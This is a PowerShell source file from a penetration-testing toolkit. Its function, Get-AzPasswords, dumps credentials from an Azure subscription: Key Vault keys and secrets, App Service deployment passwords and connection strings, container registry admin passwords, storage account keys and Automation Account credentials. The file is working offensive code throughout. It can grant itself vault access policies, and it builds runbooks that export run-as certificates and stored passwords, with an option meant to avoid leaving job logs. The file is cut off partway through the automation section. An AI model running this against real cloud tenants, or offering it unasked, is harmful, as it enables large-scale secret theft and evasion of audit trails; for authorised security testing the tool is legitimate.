<#
    File: Get-AzPasswords.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2020
    Description: PowerShell function for dumping Azure credentials using the Az PowerShell CMDlets.
#>



Function Get-AzPasswords
{
<#

    .SYNOPSIS
        Dumps all available credentials from an Azure subscription. Pipe to Out-Gridview or Export-CSV for easier parsing.
    .DESCRIPTION
        This function will look for any available credentials and certificates store in Key Vaults, App Services Configurations, and Automation accounts. 
        If the Azure management account has permissions, it will read the values directly out of the Key Vaults and App Services Configs.
        A runbook will be spun up for dumping automation account credentials, so it will create a log entry in the automation jobs.
    .PARAMETER Subscription
        Subscription to use.
    .PARAMETER ExportCerts
        Flag for saving private certs locally.           
    .EXAMPLE
        PS C:\MicroBurst> Get-AzPasswords -Verbose | Out-GridView
        VERBOSE: Logged In as testaccount@example.com
        VERBOSE: Getting List of Key Vaults...
        VERBOSE: 	Exporting items from example-private
        VERBOSE: 	Exporting items from PasswordStore
        VERBOSE: 		Getting Key value for the example-Test Key
        VERBOSE: 		Getting Key value for the RSA-KEY-1 Key
        VERBOSE: 		Getting Key value for the TestCertificate Key
        VERBOSE: 		Getting Secret value for the example-Test Secret
        VERBOSE: 			Unable to export Secret value for example-Test
        VERBOSE: 		Getting Secret value for the SuperSecretPassword Secret
        VERBOSE: 		Getting Secret value for the TestCertificate Secret
        VERBOSE: Getting List of Azure App Services...
        VERBOSE: 	Profile available for example1
        VERBOSE: 	Profile available for example2
        VERBOSE: 	Profile available for example3
        VERBOSE: Getting List of Azure Automation Accounts...
        VERBOSE: 	Getting credentials for testAccount using the lGVeLPZARrTJdDu.ps1 Runbook
        VERBOSE: 		Waiting for the automation job to complete
        VERBOSE: Password Dumping Activities Have Completed

    .LINK
    https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/    
#>


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = "",
        
        [parameter(Mandatory=$false,
        HelpMessage="Dump Key Vault Keys.")]
        [ValidateSet("Y","N")]
        [String]$Keys = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Add list and get rights for your user in the vault access policies.")]
        [ValidateSet("Y","N")]
        [String]$ModifyPolicies = "N",

        [parameter(Mandatory=$false,
        HelpMessage="Dump App Services Configurations.")]
        [ValidateSet("Y","N")]
        [String]$AppServices = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump Azure Container Registry Admin passwords.")]
        [ValidateSet("Y","N")]
        [String]$ACR = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump Storage Account Keys.")]
        [ValidateSet("Y","N")]
        [String]$StorageAccounts = "Y",
                
        [parameter(Mandatory=$false,
        HelpMessage="Dump Automation Accounts.")]
        [ValidateSet("Y","N")]
        [String]$AutomationAccounts = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Password to use for exporting the Automation certificates.")]
        [String]$CertificatePassword = "TotallyNotaHardcodedPassword...",

        [parameter(Mandatory=$false,
        HelpMessage="Dump keys for CosmosDB Accounts.")]
        [ValidateSet("Y","N")]
        [String]$CosmosDB = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump AKS clusterAdmin and clusterUser kubeconfig files.")]
        [ValidateSet("Y","N")]
        [String]$AKS = "Y",
        
        [parameter(Mandatory=$false,
        HelpMessage="Dump Function App Access Keys and Storage Account Keys.")]
        [ValidateSet("Y","N")]
        [String]$FunctionApps = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump Container App Secrets.")]
        [ValidateSet("Y","N")]
        [String]$ContainerApps = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump API Management Secrets.")]
        [ValidateSet("Y","N")]
        [String]$APIManagement = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump Service Bus Namespace keys.")]
        [ValidateSet("Y","N")]
        [String]$ServiceBus = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump App Configuration Access keys.")]
        [ValidateSet("Y","N")]
        [String]$AppConfiguration = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump Batch Account Access keys.")]
        [ValidateSet("Y","N")]
        [String]$BatchAccounts = "Y",
                
        [parameter(Mandatory=$false,
        HelpMessage="Dump Cognitive Services (OpenAI) keys.")]
        [ValidateSet("Y","N")]
        [String]$CognitiveServices = "Y",
                
        [parameter(Mandatory=$false,
        HelpMessage="Export the AKS kubeconfigs to local files.")]
        [ValidateSet("Y","N")]
        [String]$ExportKube = "N",

        [Parameter(Mandatory=$false,
        HelpMessage="Export the Key Vault certificates to local files.")]
        [ValidateSet("Y","N")]
        [string]$ExportCerts = "N",
        
        [Parameter(Mandatory=$false,
        HelpMessage="Run any Automation Account runbooks via the test pane to avoid leaving a job artifact")]
        [ValidateSet("Y","N")]
        [string]$TestPane = "N"

    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzContext
    $accountName = ($LoginStatus.Account).Id
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Connect-AzAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}
    

    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
    if ($Subscription){        
        Select-AzSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -FunctionApps $FunctionApps -ExportKube $ExportKube -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB -AKS $AKS -ContainerApps $ContainerApps -APIManagement $APIManagement -ServiceBus $ServiceBus -AppConfiguration $AppConfiguration -BatchAccounts $BatchAccounts -CognitiveServices $CognitiveServices -TestPane $TestPane}
        break
    }

    Write-Verbose "Logged In as $accountName"

    # Create data table to house results
    $TempTblCreds = New-Object System.Data.DataTable 
    $TempTblCreds.Columns.Add("Type") | Out-Null
    $TempTblCreds.Columns.Add("Name") | Out-Null
    $TempTblCreds.Columns.Add("Username") | Out-Null
    $TempTblCreds.Columns.Add("Value") | Out-Null
    $TempTblCreds.Columns.Add("PublishURL") | Out-Null
    $TempTblCreds.Columns.Add("Created") | Out-Null
    $TempTblCreds.Columns.Add("Updated") | Out-Null
    $TempTblCreds.Columns.Add("Enabled") | Out-Null
    $TempTblCreds.Columns.Add("Content Type") | Out-Null
    $TempTblCreds.Columns.Add("Vault") | Out-Null
    $TempTblCreds.Columns.Add("Subscription") | Out-Null


    $subName = (Get-AzSubscription -SubscriptionId $Subscription).Name

    if($Keys -eq 'Y'){
        # Key Vault Section
        $vaults = Get-AzKeyVault
        Write-Verbose "Getting List of Key Vaults..."
    
        foreach ($vault in $vaults){
            $vaultName = $vault.VaultName

            Write-Verbose "Starting on the $vaultName Key Vault"

            # Check list and read on the vault, add it if not there
            if($ModifyPolicies -eq 'Y'){

                $currentVault = Get-AzKeyVault -VaultName $vaultName

                # Pulls current user ObjectID from LoginStatus
                # Removed old method for Get-AzAccessToken splitting to help with PS Core and execution in Cloud Shell - keeping old method in comment
                #$currentOID = ($LoginStatus.Account.ExtendedProperties.HomeAccountId).split('.')[0]
                
                # Borrowed from - https://www.michev.info/Blog/Post/2140/decode-jwt-access-and-id-tokens-via-powershell
                $AccessToken = Get-AzAccessToken
                if ($AccessToken.Token -is [System.Security.SecureString]) {
                    $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
                    try {
                        $Token = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
                    } finally {
                        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                    }
                } else {
                    $Token = $AccessToken.Token
                }
                $tokenPayload = ($Token.Split(".")[1].Replace('-', '+').Replace('_', '/'))
                #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
                while ($tokenPayload.Length % 4) { $tokenPayload += "=" }               
                $currentOID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tokenPayload)) | ConvertFrom-Json).oid
                                
                # Base variable for reverting policies
                $needsKeyRevert = $false
                $needsSecretRevert = $false
                $needsCleanup = $false

                # If the OID is in the policies already, check if list/read available
                if($currentVault.AccessPolicies.ObjectID -contains $currentOID){

                    Write-Verbose "`tCurrent user has an existing access policy on the $vaultName vault"
                    $userPolicy = ($currentVault.AccessPolicies | where ObjectID -Match $currentOID)

                    # use the $userPolicy.PermissionsToKeys (non-str) to reset perms

                    $keyPolicyStr = $userPolicy.PermissionsToKeysStr
                    $secretPolicyStr = $userPolicy.PermissionsToSecretsStr
                    $certPolicyStr = $userPolicy.PermissionsToCertificatesStr
                                        
                    #======================Keys======================
                    # If not get, and not list try to add get and list
                    if((!($keyPolicyStr -match "Get")) -and (!($keyPolicyStr -match "List"))){
                        # Take Existing, append Get and List
                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"Get"
                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"List"

                        Write-Verbose "`t`tTrying to add Keys get/list access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy

                        # flag the need for clean up
                        $needsKeyRevert = $true
                    }
                    # If not get, and list, then try to add get
                    elseif((!($keyPolicyStr -match "Get")) -and (($keyPolicyStr -match "List"))){
                        # Take Existing, append Get
                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"Get"
                        
                        Write-Verbose "`t`tTrying to add Keys get access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy

                        # flag the need for clean up
                        $needsKeyRevert = $true

                    }
                    # If get, and not list, try to add list
                    elseif((($keyPolicyStr -match "Get")) -and (!($keyPolicyStr -match "List"))){
                        # Take Existing, append List
                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"List"

                        Write-Verbose "`t`tTrying to add Keys list access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy
                        
                        # flag the need for clean up
                        $needsKeyRevert = $true
                    }
                    else{Write-Verbose "`tCurrent user has Keys get/list access to the $vaultName vault"}

                    #======================Secrets======================

                    # If not get, and not list try to add get and list
                    if((!($secretPolicyStr -match "Get")) -and (!($secretPolicyStr -match "List"))){
                        # Take Existing, append Get and List
                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"Get"
                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"List"

                        Write-Verbose "`t`tTrying to add Secrets get/list access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy

                        # flag the need for clean up
                        $needsSecretRevert = $true
                    }
                    # If not get, and list, then try to add get
                    elseif((!($secretPolicyStr -match "Get")) -and (($secretPolicyStr -match "List"))){
                        # Take Existing, append Get
                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"Get"
                        
                        Write-Verbose "`t`tTrying to add Secrets get access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy

                        # flag the need for clean up
                        $needsSecretRevert = $true

                    }
                    # If get, and not list, try to add list
                    elseif((($secretPolicyStr -match "Get")) -and (!($secretPolicyStr -match "List"))){
                        # Take Existing, append List
                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"List"

                        Write-Verbose "`t`tTrying to add Secrets list access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy
                        
                        # flag the need for clean up
                        $needsSecretRevert = $true
                    }
                    else{Write-Verbose "`tCurrent user has Secrets get/list access in the to the $vaultName vault"}
                }
                                
                # Else, just add new rights
                else{
                    Write-Verbose "`tCurrent user does not have an access policy entry in the $vaultName vault, adding get/list rights"

                    # Add the read rights here
                    Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys get,list -PermissionsToSecrets get,list -PermissionsToCertificates get,list

                    # flag the need for clean up
                    $needsCleanup = $true
                }
            }


            try{
                $keylist = Get-AzKeyVaultKey -VaultName $vaultName -ErrorAction Stop
                                
                # Dump Keys
                Write-Verbose "`tExporting items from $vaultName"
                foreach ($key in $keylist){
                    $keyname = $key.Name
                    Write-Verbose "`t`tGetting Key value for the $keyname Key"
                    try{
                        $keyValue = Get-AzKeyVaultKey -VaultName $vault.VaultName -Name $key.Name -ErrorAction Stop
            
                        # Add Key to the table
                        $TempTblCreds.Rows.Add("Key",$keyValue.Name,"N/A",$keyValue.Key,"N/A",$keyValue.Created,$keyValue.Updated,$keyValue.Enabled,"N/A",$vault.VaultName,$subName) | Out-Null
                    }
                    catch{Write-Verbose "`t`t`tUnable to access the $keyname key"}

                }
            }
            # KVs that have Networking policies will fail, so clean up policies here
            catch{
                Write-Verbose "`t`tUnable to access the keys for the $vaultName key vault"
                # If key policies were changed, Revert them
                if($needsKeyRevert){
                    Write-Verbose "`t`tReverting the Key Access Policies for the current user on the $vaultName vault"
                    # Revert the Keys, Secrets, and Certs policies
                    Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $userPolicy.PermissionsToKeys
                }
                # If secrets policies were changed, Revert them
                if($needsSecretRevert){
                    Write-Verbose "`t`tReverting the Secrets Access Policies for the current user on the $vaultName vault"
                    # Revert the Secrets policy
                    Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $userPolicy.PermissionsToSecrets
                }
                # If Access Policy was added for your user, remove it
                if($needsCleanup){
                    Write-Verbose "`t`tRemoving current user from the Access Policies for the $vaultName vault"
                    # Delete the user from the Access Policies
                    Remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID
                }
            }

            # Dump Secrets
            try{$secrets = Get-AzKeyVaultSecret -VaultName $vault.VaultName -ErrorAction Stop}
            catch{Write-Verbose "`t`tUnable to access secrets for the $vaultName key vault"; Continue}

            foreach ($secret in $secrets){
                $secretname = $secret.Name
                Write-Verbose "`t`tGetting Secret value for the $secretname Secret"
                Try{
                    $secretValue = Get-AzKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name -ErrorAction Stop

                    $secretType = $secretValue.ContentType

                    # Fix implemented from here - https://docs.microsoft.com/en-us/azure/key-vault/secrets/quick-create-powershell
                    $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secretValue.SecretValue)
                    try {
                       $secretValueText = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
                    } 
                    finally {
                       [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                    }

                    # Write Private Certs to file
                    if (($ExportCerts -eq "Y") -and ($secretType  -eq "application/x-pkcs12")){
                            Write-Verbose "`t`t`tWriting certificate for $secretname to $pwd/$secretname.pfx"
                            $secretBytes = [convert]::FromBase64String($secretValueText)
                            [IO.File]::WriteAllBytes((Join-Path -Path $PWD -ChildPath "$secretname.pfx"), $secretBytes)
                        }


                    # Add Secret to the table
                    $TempTblCreds.Rows.Add("Secret",$secretValue.Name,"N/A",$secretValueText,"N/A",$secretValue.Created,$secretValue.Updated,$secretValue.Enabled,$secretValue.ContentType,$vault.VaultName,$subName) | Out-Null
                }
                Catch{Write-Verbose "`t`t`tUnable to export Secret value for $secretname"}
            }

            # If key policies were changed, Revert them
            if($needsKeyRevert){
                Write-Verbose "`tReverting the Key Access Policies for the current user on the $vaultName vault"
                # Revert the Keys, Secrets, and Certs policies
                Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $userPolicy.PermissionsToKeys
            }

            # If secrets policies were changed, Revert them
            if($needsSecretRevert){
                Write-Verbose "`tReverting the Secrets Access Policies for the current user on the $vaultName vault"
                # Revert the Secrets policy
                Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $userPolicy.PermissionsToSecrets
            }

            # If Access Policy was added for your user, remove it
            if($needsCleanup){
                Write-Verbose "`tRemoving current user from the Access Policies for the $vaultName vault"
                # Delete the user from the Access Policies
                Remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID
            }
        }
    }

    if($AppServices -eq 'Y'){

        # App Services Section
        Write-Verbose "Getting List of Azure App Services..."

        # Get-AzWebApp won't return site config parameters without an RG
        $resourceGroups = Get-AzResourceGroup
        
        $resourceGroups | ForEach-Object{
            # Read App Services configs
            $appServs = Get-AzWebApp -ResourceGroupName $_.ResourceGroupName
            $appServs | ForEach-Object{
                $appServiceName = $_.Name
            
                # Get the site config parameters to find parameters that are KV references
                $appServiceParameters = $_.SiteConfig.AppSettings | where Value -like '@Microsoft.KeyVault*'

                $resourceGroupName = Get-AzResource -ResourceId $_.Id | select ResourceGroupName

                # Get each config 
                try{
                    [xml]$configFile = Get-AzWebAppPublishingProfile -ResourceGroup $resourceGroupName.ResourceGroupName -Name $_.Name -ErrorAction Stop
            
                    if ($configFile){
                        foreach ($profile in $configFile.publishData.publishProfile){
                            # Read Deployment Passwords and add to the output table
                            $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName,$profile.userName,$profile.userPWD,$profile.publishUrl,"N/A","N/A","N/A","Password","N/A",$subName) | Out-Null

                            if($appServiceParameters.Count -gt 0){
                                #Need to convert deployment creds to a basic authentication header
                                $basicHeader = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes((-join(($profile.userName),":",($profile.userPWD)))))
                                $configReq = Invoke-WebRequest -Verbose:$false -Method GET -Uri (-join ("https://", $appServiceName, ".scm.azurewebsites.net/api/settings")) -Headers @{Authorization="Basic $basicHeader"} -ErrorAction Continue
                                $configResult = ($configReq.Content | ConvertFrom-Json)

                                $appServiceParameters | ForEach-Object{
                                    # Match the vault parameter and add it to the output
                                    $TempTblCreds.Rows.Add("AppServiceVaultParameter",$appServiceName+" - Parameter",($_.Name),($configResult.($_.Name)),"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null                                    
                                }
                                $appServiceParameters = $null
                            }                            
                    
                            # Parse Connection Strings                    
                            if ($profile.SQLServerDBConnectionString){
                                $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName+"-ConnectionString","N/A",$profile.SQLServerDBConnectionString,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
                            }
                            if ($profile.mySQLDBConnectionString){
                                $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName+"-ConnectionString","N/A",$profile.mySQLDBConnectionString,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
                            }
                        }

                        # Grab additional custom connection strings
                        $resourceName = $_.Name+"/connectionstrings"
                        $resource = Invoke-AzResourceAction -ResourceGroupName $_.ResourceGroup -ResourceType Microsoft.Web/sites/config -ResourceName $resourceName -Action list -ApiVersion 2015-08-01 -Force
                        $propName = $resource.properties | gm -M NoteProperty | select name
                        
                        if($resource.Properties.($propName.Name).type -eq 3){
                            $TempTblCreds.Rows.Add("AppServiceConfig",$_.Name+" - Custom-ConnectionString","N/A",$resource.Properties.($propName.Name).value,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
                        }

                        # Grab Authentication Service Principals
                        if(($_.SiteConfig.AppSettings | where Name -EQ 'MICROSOFT_PROVIDER_AUTHENTICATION_SECRET').value -ne $null){
                            $spSecret = ($_.SiteConfig.AppSettings | where Name -EQ 'MICROSOFT_PROVIDER_AUTHENTICATION_SECRET').value

                            # Use APIs to grab Client ID
                            $AccessToken = Get-AzAccessToken -ResourceUrl "https://management.azure.com/"
                            if ($AccessToken.Token -is [System.Security.SecureString]) {
                                $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
                                try {
                                    $mgmtToken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
                                } finally {
                                    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                                }
                            } else {
                                $mgmtToken = $AccessToken.Token
                            }
                            $subID = (get-azcontext).Subscription.Id
                            $servicePrincipalID = ((Invoke-WebRequest -Uri (-join('https://management.azure.com/subscriptions/',$subID,'/resourceGroups/',$_.ResourceGroup,'/providers/Microsoft.Web/sites/',$_.Name,'/Config/authsettingsV2/list?api-version=2018-11-01')) -UseBasicParsing -Headers @{ Authorization ="Bearer $mgmtToken"} -Verbose:$false ).content | ConvertFrom-Json).properties.identityProviders.azureActiveDirectory.registration.clientId

                            $spClientID = ""
                            $TempTblCreds.Rows.Add("AppServiceConfig",$_.Name+" - ServicePrincipal",$servicePrincipalID,$spSecret,"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null
                        }
                    }
                    Write-Verbose "`tProfile available for $appServiceName"
                }
                catch{Write-Verbose "`tNo profile available for $appServiceName"}
            }
        }
    }

    if ($ACR -eq 'Y'){
        # Container Registry Section
        Write-Verbose "Getting List of Azure Container Registries..."
        $registries = Get-AzContainerRegistry
        $registries | ForEach-Object {
           if ($_.AdminUserEnabled -eq 'True'){
                try{
                $loginServer = $_.LoginServer
                $name = $_.Name
                Write-Verbose "`tGetting the Admin User password for $loginServer"
                $ACRpasswords = Get-AzContainerRegistryCredential -ResourceGroupName $_.ResourceGroupName -Name $name
                $TempTblCreds.Rows.Add("ACR-AdminUser",$_.LoginServer,$ACRpasswords.Username,$ACRpasswords.Password,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                $TempTblCreds.Rows.Add("ACR-AdminUser",$_.LoginServer,$ACRpasswords.Username,$ACRpasswords.Password2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                }
                catch{Write-Verbose "`tuser does not have authorization to perform action Get-AzContainerRegistryCredential for container registry $name"}
            }
        }
    }

    if($StorageAccounts -eq 'Y'){
        # Storage Account Section
        Write-Verbose "Getting List of Storage Accounts..."
        $storageAccountList = Get-AzStorageAccount
        $storageAccountList | ForEach-Object {
            $saName = $_.StorageAccountName
            Write-Verbose "`tGetting the Storage Account keys for the $saName account"
            $saKeys = Get-AzStorageAccountKey -ResourceGroupName $_.ResourceGroupName -Name $_.StorageAccountName
            $saKeys | ForEach-Object{
                $TempTblCreds.Rows.Add("Storage Account",$saName,$_.KeyName,$_.Value,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
            }
        }
    }

    if ($AutomationAccounts -eq 'Y'){
        # Automation Accounts Section
        $AutoAccounts = Get-AzAutomationAccount
        Write-Verbose "Getting List of Azure Automation Accounts..."

        if($AutoAccounts -ne $null){
            # Get Cert path from 
            $cert = Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst

            if ($cert -eq $null){
                # Create new Cert
                New-SelfSignedCertificate -DnsName microburst -CertStoreLocation "Cert:\CurrentUser\My" -KeyUsage KeyEncipherment,DataEncipherment, KeyAgreement -Type DocumentEncryptionCert | Out-Null

                # Get Cert path from 
                $cert = Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst
            }

            # Export to cer
            Export-Certificate -Cert $cert -FilePath .\microburst.cer | Out-Null

            # Cast Cert file to B64
            $ENCbase64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(-join($pwd,"\microburst.cer")))


            foreach ($AutoAccount in $AutoAccounts){

                $verboseName = $AutoAccount.AutomationAccountName

                # Check for Automation Account Stored Credentials
                $autoCred = (Get-AzAutomationCredential -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName).Name

                # Check for Automation Account Connections
                $autoConnections = Get-AzAutomationConnection -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName
            
                # Clear out jobList variable
                $jobList = $null

                # For each connection, create a runbook for exporting the connection cert
                $autoConnections | ForEach-Object{
                    $autoConnectionName = $_.Name

                    # Make the call again with the specific Connection name
                    $detailAutoConnection = Get-AzAutomationConnection -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Name $autoConnectionName
                
                    # Parse values
                    $autoConnectionThumbprint = $detailAutoConnection.FieldDefinitionValues.CertificateThumbprint
                    $autoConnectionTenantId = $detailAutoConnection.FieldDefinitionValues.TenantId
                    $autoConnectionApplicationId = $detailAutoConnection.FieldDefinitionValues.ApplicationId

                    # Get the actual cert name to pass into the runbook
                    $runbookCert = Get-AzAutomationCertificate -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | where Thumbprint -EQ $autoConnectionThumbprint
                    $runbookCertName = $runbookCert.Name

                    # Set Random names for the runbooks. Prevents conflict issues
                    $jobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
                                
                        # Set the runbook to export the runas certificate and write Script to local file
                        "`$RunAsCert = Get-AutomationCertificate -Name '$runbookCertName'" | Out-File -FilePath "$pwd\$jobName.ps1" 
                        "`$CertificatePath = Join-Path `$env:temp $verboseName-AzureRunAsCertificate.pfx" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        "`$Cert = `$RunAsCert.Export('pfx','$CertificatePassword')" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        "Set-Content -Value `$Cert -Path `$CertificatePath -Force -Encoding Byte | Write-Verbose " | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        
                        # Cast to Base64 string in Automation, write it to output
                        "`$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(`$CertificatePath))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append

                        # Copy the B64 encryption cert to the Automation Account host
                        "New-Item -ItemType Directory -Force -Path `"C:\Temp`" | Out-Null" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName.ps1" -Append

                        # Encrypt the passwords in the Automation account output
                        "`$encryptedOut = (`$base64string | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName.ps1" -Append

                        # Remove the Certificate from the Cert Store
                        "`Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst | Remove-Item" | Out-File -FilePath "$pwd\$jobName.ps1" -Append

                        # Write the output to the log
                        "write-output `$encryptedOut" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        
               
                    # Cast Name for runas scripts for each connection                
                    $runAsName = -join($verboseName,'-',$autoConnectionName)

                        "`$thumbprint = '$autoConnectionThumbprint'"| Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1"
                        "`$tenantID = '$autoConnectionTenantId'" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append                                               
                        "`$appId = '$autoConnectionApplicationId'" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append

                        "`$SecureCertificatePassword = ConvertTo-SecureString -String $CertificatePassword -AsPlainText -Force" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
                        "Import-PfxCertificate -FilePath .\$runAsName-AzureRunAsCertificate.pfx -CertStoreLocation Cert:\LocalMachine\My -Password `$SecureCertificatePassword" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
                        "Add-AzAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append

                    if($jobList){
                        $jobList += @(@($jobName,$runAsName))
                    }
                    else{
                        $jobList = @(@($jobName,$runAsName))
                    }
                }



                # If other creds are available, get the credentials from the runbook
                if ($autoCred -ne $null){
                    # foreach credential in autocred, create a new file, add the name to the list
                    foreach ($subCred in $autoCred){
                        # Set Random names for the runbooks. Prevents conflict issues
                        $jobName2 = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                        # Write Script to local file
                        "`$myCredential = Get-AutomationPSCredential -Name '$subCred'" | Out-File -FilePath "$pwd\$jobName2.ps1" 
                        "`$userName = `$myCredential.UserName" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                        "`$password = `$myCredential.GetNetworkCredential().Password" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                        # Copy the B64 encryption cert to the Automation Account host
                        "New-Item -ItemType Directory -Force -Path `"C:\Temp`" | Out-Null" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                        "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                        "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                        "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                        # Encrypt the passwords in the Automation account output
